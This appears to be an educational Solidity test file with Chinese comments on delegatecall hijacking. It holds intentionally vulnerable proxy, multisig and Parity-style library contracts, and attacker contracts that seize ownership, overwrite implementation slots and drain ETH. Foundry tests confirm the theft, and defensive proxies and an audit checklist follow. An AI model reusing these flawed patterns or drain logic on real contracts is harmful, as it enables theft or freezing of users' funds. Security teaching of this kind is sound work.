// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Delegatecall Hijacking 攻击示例
 * @notice 这是代理模式、可升级合约、多签钱包的核心安全问题
 * 
 * 核心概念：
 * - delegatecall在调用者的上下文执行代码
 * - msg.sender, storage, balance都是调用者的
 * - 如果目标地址可控，攻击者可以执行任意代码
 * 
 */

// ============ 场景1: 未初始化的代理合约 ============

/**
 * @title 简单的代理合约
 * @notice 使用delegatecall转发所有调用到implementation
 */
contract SimpleProxy {
    address public implementation;
    address public owner;
    uint256 public value;
    
    // 漏洞：构造函数没有初始化owner和implementation
    constructor() {
        // implementation和owner都是零地址！
    }
    
    // 设置implementation（应该受保护）
    function setImplementation(address _implementation) external {
        // 没有权限检查！
        implementation = _implementation;
    }
    
    // Fallback：转发所有调用
    fallback() external payable {
        address impl = implementation;
        require(impl != address(0), "Implementation not set");
        
        assembly {
            // 复制calldata
            calldatacopy(0, 0, calldatasize())
            
            // delegatecall到implementation
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            
            // 复制返回数据
            returndatacopy(0, 0, returndatasize())
            
            // 根据结果返回或revert
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    receive() external payable {}
}

/**
 * @title 正常的逻辑合约
 */
contract LogicContract {
    address public implementation;
    address public owner;
    uint256 public value;
    
    function initialize(address _owner) external {
        require(owner == address(0), "Already initialized");
        owner = _owner;
    }
    
    function setValue(uint256 _value) external {
        require(msg.sender == owner, "Not owner");
        value = _value;
    }
}

/**
 * @title 恶意的逻辑合约
 */
contract MaliciousLogic {
    address public implementation;
    address public owner;
    uint256 public value;
    
    // ✗ 恶意初始化：把owner设置为攻击者
    function initialize() external {
        owner = msg.sender;
    }
    
    // 窃取合约的所有ETH
    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @title 未初始化代理攻击者
 */
contract UninitializedProxyAttacker {
    SimpleProxy public proxy;
    MaliciousLogic public malicious;
    
    constructor(address _proxy) {
        proxy = SimpleProxy(payable(_proxy));
        malicious = new MaliciousLogic();
    }
    
    function attack() external {
        console.log("\n=== Uninitialized Proxy Attack ===");
        console.log("Proxy owner before:", proxy.owner());
        console.log("Attacker:", address(this));
        
        // 第1步：设置恶意implementation
        console.log("\nStep 1: Set malicious implementation");
        proxy.setImplementation(address(malicious));
        console.log("Implementation set to:", address(malicious));
        
        // 第2步：通过delegatecall调用恶意initialize
        console.log("\nStep 2: Call malicious initialize via delegatecall");
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Initialize failed");
        
        console.log("Proxy owner after:", proxy.owner());
        console.log("Owner hijacked!");
        
        // 第3步：窃取资金
        if (address(proxy).balance > 0) {
            console.log("\nStep 3: Drain funds");
            console.log("Proxy balance:", address(proxy).balance);
            
            (success, ) = address(proxy).call(
                abi.encodeWithSignature("drain()")
            );
            require(success, "Drain failed");
            
            console.log("Attacker balance:", address(this).balance);
        }
    }
    
    receive() external payable {}
}

// ============ 场景2: 可变的Delegatecall目标 ============

/**
 * @title 存储槽冲突的代理
 * @notice 经典的storage collision漏洞
 */
contract VulnerableStorageProxy {
    // Slot 0: implementation地址
    address public implementation;
    
    // 问题：implementation在slot 0
    // 如果logic合约的第一个变量也在slot 0
    // delegatecall可能会覆盖implementation!
    
    constructor(address _implementation) {
        implementation = _implementation;
    }
    
    fallback() external payable {
        address impl = implementation;
        
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/**
 * @title 存储布局不兼容的逻辑合约
 */
contract BadLogicContract {
    // Slot 0: owner（会覆盖proxy的implementation!）
    address public owner;
    
    uint256 public data;
    
    function setOwner(address _owner) external {
        // ✗ 这会写入slot 0
        // 在proxy中，slot 0是implementation
        // 所以这会修改proxy的implementation地址！
        owner = _owner;
    }
    
    function getData() external view returns (uint256) {
        return data;
    }
}

/**
 * @title 存储槽冲突攻击者
 */
contract StorageCollisionAttacker {
    VulnerableStorageProxy public proxy;
    MaliciousLogic public malicious;
    
    constructor(address _proxy) {
        proxy = VulnerableStorageProxy(payable(_proxy));
        malicious = new MaliciousLogic();
    }
    
    function attack() external {
        console.log("\n=== Storage Collision Attack ===");
        console.log("Proxy implementation:", proxy.implementation());
        console.log("Malicious logic:", address(malicious));
        
        // 通过setOwner修改proxy的implementation
        console.log("\nCalling setOwner via delegatecall...");
        console.log("This will overwrite implementation in proxy's slot 0");
        
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature("setOwner(address)", address(malicious))
        );
        require(success, "setOwner failed");
        
        console.log("\nProxy implementation after:", proxy.implementation());
        console.log("Implementation hijacked!");
        
        // 现在可以调用恶意合约的任何函数
        console.log("\nCalling malicious initialize...");
        (success, ) = address(proxy).call(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Initialize failed");
        
        console.log("Proxy now controlled by attacker");
    }
}

// ============ 场景3: Selfdestruct + Delegatecall ============

/**
 * @title 使用delegatecall的多签钱包
 */
contract MultiSigWallet {
    address[] public owners;
    mapping(address => bool) public isOwner;
    uint256 public required;
    
    constructor(address[] memory _owners, uint256 _required) {
        require(_owners.length >= _required, "Invalid threshold");
        
        for (uint256 i = 0; i < _owners.length; i++) {
            address owner = _owners[i];
            require(owner != address(0), "Invalid owner");
            require(!isOwner[owner], "Duplicate owner");
            
            isOwner[owner] = true;
            owners.push(owner);
        }
        
        required = _required;
    }
    
    // 危险：允许delegatecall到任意地址
    function execute(
        address to,
        uint256 value,
        bytes memory data,
        bool isDelegateCall
    ) external returns (bool success) {
        require(isOwner[msg.sender], "Not owner");
        
        if (isDelegateCall) {
            // 非常危险！
            (success, ) = to.delegatecall(data);
        } else {
            (success, ) = to.call{value: value}(data);
        }
    }
    
    receive() external payable {}
}

/**
 * @title 包含selfdestruct的合约
 */
contract SelfDestructContract {
    function destroyAndSend(address payable recipient) external {
        selfdestruct(recipient);
    }
}

/**
 * @title Selfdestruct攻击者
 */
contract SelfDestructAttacker {
    SelfDestructContract public destructContract;

    constructor() {
        destructContract = new SelfDestructContract();
    }

    function attack(MultiSigWallet wallet) external {
        console.log("\n=== Selfdestruct via Delegatecall Attack ===");
        console.log("Wallet address:", address(wallet));
        console.log("Wallet balance:", address(wallet).balance);
        console.log("Wallet owners:", wallet.owners(0));
        
        // 通过delegatecall调用selfdestruct
        // 这会销毁wallet合约本身！
        console.log("\nCalling selfdestruct via delegatecall...");
        
        bytes memory data = abi.encodeWithSignature(
            "destroyAndSend(address)",
            address(this)
        );
        
        wallet.execute(
            address(destructContract),
            0,
            data,
            true  // isDelegateCall = true
        );

        console.log("\nWallet selfdestruct executed (code deletion depends on EVM semantics)");
        console.log("Wallet code size:", address(wallet).code.length);
        console.log("Attacker received:", address(this).balance);
    }
    
    receive() external payable {}
}

// ============ 场景4: Library的Delegatecall劫持 ============

/**
 * @title 可更新的Library代理
 */
contract LibraryProxy {
    address public libraryAddress;
    address public owner;
    
    constructor(address _library) {
        libraryAddress = _library;
        owner = msg.sender;
    }
    
    // 漏洞：owner检查不当
    function setLibrary(address _library) external {
        require(msg.sender == owner, "Not owner");
        libraryAddress = _library;
    }
    
    // 使用library
    function useLibrary(bytes memory data) external returns (bytes memory) {
        (bool success, bytes memory result) = libraryAddress.delegatecall(data);
        require(success, "Delegatecall failed");
        return result;
    }
}

/**
 * @title 正常的Library
 */
library MathLibrary {
    function add(uint256 a, uint256 b) external pure returns (uint256) {
        return a + b;
    }
    
    function multiply(uint256 a, uint256 b) external pure returns (uint256) {
        return a * b;
    }
}

/**
 * @title 恶意Library（实际是合约）
 */
contract MaliciousLibrary {
    // 匹配LibraryProxy的存储布局
    address public libraryAddress;  // slot 0
    address public owner;           // slot 1
    
    // 伪装成math函数，实际修改owner
    function add(uint256 a, uint256 b) external returns (uint256) {
        // ✗ 修改slot 1（owner）
        owner = address(uint160(a));  // 将a转换为地址并设置为owner
        return b;
    }
}

/**
 * @title Library劫持攻击者
 */
contract LibraryHijacker {
    LibraryProxy public proxy;
    MaliciousLibrary public maliciousLib;
    
    constructor(address _proxy) {
        proxy = LibraryProxy(_proxy);
        maliciousLib = new MaliciousLibrary();
    }
    
    function attack() external {
        console.log("\n=== Library Hijack Attack ===");
        console.log("Proxy owner:", proxy.owner());
        console.log("Attacker:", address(this));
        
        // 第1步：成为owner需要先劫持
        // 我们通过调用恶意library来修改owner
        
        console.log("\nStep 1: Call malicious library");
        console.log("Pretending to call add(), but actually modifying owner");
        
        bytes memory data = abi.encodeWithSignature(
            "add(uint256,uint256)",
            uint256(uint160(address(this))),  // 新owner（伪装成参数a）
            0
        );
        
        // 如果当前的library是恶意的，这会修改owner
        // 但我们需要先设置恶意library...
        
        // 实际攻击流程：
        // 1. 找到能调用setLibrary的方式
        // 2. 或者利用其他漏洞（如重入、初始化问题等）
        
        console.log("\nIn real attack:");
        console.log("1. Find a way to call setLibrary");
        console.log("2. Or exploit initialization vulnerability");
        console.log("3. Or combine with other vulnerabilities");
    }
}

// ============ 场景5: Parity多签钱包漏洞（历史真实案例）============

/**
 * @title Parity钱包的Library（简化版）
 * @notice 2017年导致$150M损失的漏洞
 */
contract ParityWalletLibrary {
    address public owner;
    mapping(address => bool) public isOwner;
    
    // 初始化函数没有保护
    function initWallet(address _owner) external {
        require(owner == address(0), "Already initialized");
        owner = _owner;
        isOwner[_owner] = true;
    }
    
    function execute(address to, uint256 value, bytes memory data) external {
        require(isOwner[msg.sender], "Not owner");
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }
    
    // 关键漏洞：kill函数
    function kill(address payable to) external {
        require(isOwner[msg.sender], "Not owner");
        selfdestruct(to);
    }
}

/**
 * @title Parity钱包代理
 */
contract ParityWallet {
    address public libraryAddress;
    
    constructor(address _library) {
        libraryAddress = _library;
    }
    
    fallback() external payable {
        address lib = libraryAddress;
        
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), lib, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    receive() external payable {}
}

/**
 * @title Parity攻击者（devops199的攻击）
 */
contract ParityAttacker {
    ParityWalletLibrary public walletLibrary;
    
    constructor(address _library) {
        walletLibrary = ParityWalletLibrary(_library);
    }
    
    function attack() external {
        console.log("\n=== Parity Wallet Attack (2017) ===");
        console.log("Library address:", address(walletLibrary));
        console.log("Library owner before:", walletLibrary.owner());
        
        // 第1步：初始化library（它本身是个合约）
        console.log("\nStep 1: Initialize the library itself");
        console.log("The library was meant to be used via delegatecall");
        console.log("But it's also a regular contract that can be called directly!");
        
        walletLibrary.initWallet(address(this));
        
        console.log("Library owner after:", walletLibrary.owner());
        console.log("Attacker is now owner of the library!");
        
        // 第2步：销毁library
        console.log("\nStep 2: Kill the library");
        console.log("All wallets using this library will break!");
        
        walletLibrary.kill(payable(address(this)));
        
        console.log("Library kill executed (code deletion depends on EVM semantics)");
        console.log("Library code size:", address(walletLibrary).code.length);
        console.log("\nResult: All ~584 wallets using this library are now frozen");
        console.log("Total locked: ~$150M USD (2017 prices)");
    }
}

// ============ 防御示例 ============

/**
 * @title 安全的代理合约
 */
contract SecureProxy {
    //  使用immutable，不能被修改
    address public immutable implementation;
    
    //  初始化标志
    bool private initialized;
    
    constructor(address _implementation) {
        require(_implementation != address(0), "Invalid implementation");
        implementation = _implementation;
    }
    
    //  初始化函数有保护
    function initialize(bytes memory data) external {
        require(!initialized, "Already initialized");
        initialized = true;
        
        (bool success, ) = implementation.delegatecall(data);
        require(success, "Initialize failed");
    }
    
    fallback() external payable {
        require(initialized, "Not initialized");
        
        address impl = implementation;
        
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/**
 * @title 带存储槽管理的代理
 */
contract StorageSafeProxy {
    // EIP-1967: 标准的存储槽位置
    // bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)
    bytes32 private constant IMPLEMENTATION_SLOT = 
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    
    constructor(address _implementation, address _admin) {
        _setImplementation(_implementation);
        _setAdmin(_admin);
    }
    
    function _setImplementation(address newImplementation) private {
        assembly {
            sstore(IMPLEMENTATION_SLOT, newImplementation)
        }
    }
    
    function _setAdmin(address newAdmin) private {
        assembly {
            sstore(ADMIN_SLOT, newAdmin)
        }
    }
    
    function _getImplementation() private view returns (address impl) {
        assembly {
            impl := sload(IMPLEMENTATION_SLOT)
        }
    }
    
    function _getAdmin() private view returns (address admin) {
        assembly {
            admin := sload(ADMIN_SLOT)
        }
    }
    
    // 只有admin可以升级
    function upgradeTo(address newImplementation) external {
        require(msg.sender == _getAdmin(), "Not admin");
        _setImplementation(newImplementation);
    }
    
    fallback() external payable {
        address impl = _getImplementation();
        
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// ============ Foundry 测试 ============

contract DelegatecallHijackingTest is Test {
    SimpleProxy public proxy;
    LogicContract public logic;
    UninitializedProxyAttacker public attacker;
    
    function setUp() public {
        proxy = new SimpleProxy();
        logic = new LogicContract();
        
        // 给proxy一些ETH
        vm.deal(address(proxy), 10 ether);
    }
    
    function testUninitializedProxyAttack() public {
        attacker = new UninitializedProxyAttacker(address(proxy));
        
        console.log("=== Before Attack ===");
        console.log("Proxy balance:", address(proxy).balance);
        console.log("Attacker balance:", address(attacker).balance);
        
        attacker.attack();
        
        console.log("\n=== After Attack ===");
        console.log("Proxy balance:", address(proxy).balance);
        console.log("Attacker balance:", address(attacker).balance);
        
        assertTrue(address(attacker).balance > 0, "Attack should steal funds");
        assertTrue(proxy.owner() == address(attacker), "Owner should be hijacked");
    }
}

contract StorageCollisionTest is Test {
    VulnerableStorageProxy public proxy;
    BadLogicContract public logic;
    StorageCollisionAttacker public attacker;
    
    function setUp() public {
        logic = new BadLogicContract();
        proxy = new VulnerableStorageProxy(address(logic));
    }
    
    function testStorageCollision() public {
        console.log("=== Storage Collision Test ===");
        
        address implBefore = proxy.implementation();
        console.log("Implementation before:", implBefore);
        
        attacker = new StorageCollisionAttacker(address(proxy));
        attacker.attack();
        
        address implAfter = proxy.implementation();
        console.log("Implementation after:", implAfter);
        
        assertTrue(implAfter != implBefore, "Implementation should be changed");
    }
}

contract SelfDestructTest is Test {
    SelfDestructAttacker public attacker;
    
    function setUp() public {
        attacker = new SelfDestructAttacker();
    }
    
    function testSelfDestructAttack() public {
        console.log("=== Selfdestruct Test ===");

        address[] memory owners = new address[](1);
        owners[0] = address(attacker);

        MultiSigWallet wallet = new MultiSigWallet(owners, 1);
        vm.deal(address(wallet), 10 ether);

        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 walletBalanceBefore = address(wallet).balance;

        console.log("Wallet code size before:", address(wallet).code.length);
        
        attacker.attack(wallet);
        
        console.log("Wallet code size after:", address(wallet).code.length);

        assertEq(address(wallet).balance, 0, "Wallet balance should be drained");
        assertEq(address(attacker).balance, attackerBalanceBefore + walletBalanceBefore, "Attacker should receive funds");
    }
}

contract ParityTest is Test {
    ParityAttacker public attacker;
    
    function testParityAttack() public {
        console.log("=== Parity Attack Test ===");

        ParityWalletLibrary walletLibrary = new ParityWalletLibrary();
        vm.deal(address(walletLibrary), 1 ether);
        console.log("Library code size before:", address(walletLibrary).code.length);
        
        attacker = new ParityAttacker(address(walletLibrary));
        attacker.attack();
        
        console.log("Library code size after:", address(walletLibrary).code.length);

        assertEq(address(walletLibrary).balance, 0, "Library balance should be drained");
        assertEq(address(attacker).balance, 1 ether, "Attacker should receive library funds");
    }
}

/**
 * ============ 核心知识点总结 ============
 * 
 * 1. Delegatecall的本质：
 *    - 在调用者的上下文中执行代码
 *    - msg.sender, msg.value, storage都是调用者的
 *    - 相当于"复制目标合约的代码到自己这里执行"
 * 
 * 2. 五大攻击场景：
 *    
 *    A. 未初始化代理
 *    - 代理没有初始化owner/implementation
 *    - 攻击者可以自己初始化
 *    - 获得控制权
 *    
 *    B. 存储槽冲突
 *    - Proxy和Logic的存储布局不匹配
 *    - Delegatecall会覆盖proxy的关键变量
 *    - 可以修改implementation地址
 *    
 *    C. Selfdestruct劫持
 *    - Delegatecall到包含selfdestruct的合约
 *    - 销毁调用者合约本身
 *    - Parity第二次事件就是这个
 *    
 *    D. Library劫持
 *    - 可更新的library地址
 *    - 设置为恶意合约
 *    - 通过delegatecall执行恶意代码
 *    
 *    E. Parity钱包（历史案例）
 *    - Library本身可以被直接调用
 *    - 攻击者初始化并销毁library
 *    - 所有使用该library的钱包冻结
 * 
 * 3. 真实案例：
 *    
 *    Parity第一次 (2017.07) - $30M
 *    - 多签钱包的initWallet没有保护
 *    - 攻击者调用initWallet成为owner
 *    - 转走所有资金
 *    
 *    Parity第二次 (2017.11) - $150M锁定
 *    - Library本身可以被初始化
 *    - devops199"意外"初始化并销毁library
 *    - 584个钱包永久冻结
 *    - 资金无法取出
 *    
 *    Akutars (2022.04) - $34M永久锁定
 *    - 处理退款逻辑有误
 *    - 导致合约无法调用refund
 *    - 所有资金永久锁定
 * 
 * 4. 存储槽冲突详解：
 *    
 *    Proxy存储布局：
 *    slot 0: address implementation
 *    slot 1: address owner
 *    
 *    Logic存储布局（错误）：
 *    slot 0: address owner
 *    slot 1: uint256 data
 *    
 *    问题：
 *    - Logic修改owner → 写入slot 0
 *    - Proxy的slot 0是implementation
 *    - 结果：implementation被覆盖！
 *    
 *    正确做法：
 *    - Logic的存储布局必须和Proxy完全匹配
 *    - 或使用EIP-1967标准槽位
 * 
 * 5. 防御策略：
 *    
 *    方案A: 使用immutable（最安全）
 *    - Implementation地址不可变
 *    - 无法被攻击
 *    - 缺点：无法升级
 *    
 *    方案B: 严格的访问控制
 *    - 只有admin可以修改implementation
 *    - Admin需要多签或时间锁
 *    - 初始化要有保护
 *    
 *    方案C: EIP-1967标准槽位
 *    - 使用特殊的存储槽位
 *    - 避免与logic合约冲突
 *    - OpenZeppelin实现了这个
 *    
 *    方案D: 禁止危险操作
 *    - 不允许delegatecall到任意地址
 *    - 白名单可信的library
 *    - 禁止selfdestruct
 * 
 * 6. 审计要点：
 *    
 *    检查代理模式：
 *    - [ ] Implementation是否可变？
 *    - [ ] 谁可以修改？访问控制是否严格？
 *    - [ ] 是否有初始化保护？
 *    - [ ] 初始化是否可以重复调用？
 *    
 *    检查存储布局：
 *    - [ ] Proxy和Logic存储布局是否匹配？
 *    - [ ] 是否使用EIP-1967标准？
 *    - [ ] 升级时是否检查兼容性？
 *    
 *    检查delegatecall使用：
 *    - [ ] 是否允许delegatecall到任意地址？
 *    - [ ] 目标地址是否可控？
 *    - [ ] 是否有白名单验证？
 *    
 *    检查危险操作：
 *    - [ ] Logic合约是否包含selfdestruct？
 *    - [ ] 是否可以通过delegatecall触发？
 *    - [ ] 是否有防护措施？
 * */
